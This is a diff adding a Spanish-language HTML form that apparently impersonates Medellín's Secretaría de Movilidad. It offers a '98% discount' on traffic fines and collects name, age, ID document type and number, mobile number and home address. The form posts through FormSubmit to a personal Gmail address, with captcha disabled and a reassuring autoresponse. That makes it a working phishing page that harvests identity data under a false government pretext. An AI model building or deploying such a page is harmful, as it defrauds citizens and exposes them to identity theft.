@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Contacto - Descuento Multas</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="form-wrapper">
+            <div class="header">
+                <div class="image-container">
+                    <img src="images/151546099_10158179590868505_4727341738203638501_n.jpg" alt="Alcaldía de Medellín - Secretaría de Movilidad" id="headerImage" class="header-image">
+                </div>
+                <h1>Formulario de Contacto</h1>
+                <p class="subtitle">Complete sus datos para acceder a descuentos especiales</p>
+            </div>
+            
+            <form id="contactForm" class="contact-form" action="https://formsubmit.co/escritorioremotox2@gmail.com" method="POST">
+                <!-- Configuración de FormSubmit -->
+                <input type="hidden" name="_subject" value="Nuevo Formulario de Contacto - Descuento Multas">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="">
+                <input type="hidden" name="_autoresponse" value="Gracias por completar el formulario. Hemos recibido su información correctamente.">
+                
+                <div class="form-group">
+                    <label for="nombre">Nombre:</label>
+                    <input 
+                        type="text" 
+                        id="nombre" 
+                        name="nombre" 
+                        required 
+                        placeholder="Ingrese su nombre completo"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="edad">Edad:</label>
+                    <input 
+                        type="number" 
+                        id="edad" 
+                        name="edad" 
+                        required 
+                        min="1" 
+                        max="120"
+                        placeholder="Ingrese su edad"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="tipoDocumento">Tipo de Documento:</label>
+                    <select id="tipoDocumento" name="tipoDocumento" required>
+                        <option value="">Seleccione una opción</option>
+                        <option value="CE">CE</option>
+                        <option value="CC">CC</option>
+                        <option value="TI">TI</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="numeroDocumento">Número de Documento:</label>
+                    <input 
+                        type="text" 
+                        id="numeroDocumento" 
+                        name="numeroDocumento" 
+                        required 
+                        placeholder="Ingrese su número de documento"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="numeroCelular">Número de Celular:</label>
+                    <input 
+                        type="tel" 
+                        id="numeroCelular" 
+                        name="numeroCelular" 
+                        required 
+                        placeholder="Ingrese su número de celular"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="direccion">Dirección:</label>
+                    <textarea 
+                        id="direccion" 
+                        name="direccion" 
+                        required 
+                        rows="3"
+                        placeholder="Ingrese su dirección completa"
+                    ></textarea>
+                </div>
+
+                <div class="form-group checkbox-group">
+                    <label class="checkbox-label">
+                        <input 
+                            type="checkbox" 
+                            id="aceptaQR" 
+                            name="aceptaQR" 
+                            required
+                        >
+                        <span class="checkbox-text">
+                            Acepta usted generar un QR para descuento del 98% de las multas de tránsito y transporte.
+                        </span>
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn">Enviar Formulario</button>
+            </form>
+
+            <div id="successMessage" class="success-message hidden">
+                <p>¡Formulario enviado exitosamente!</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
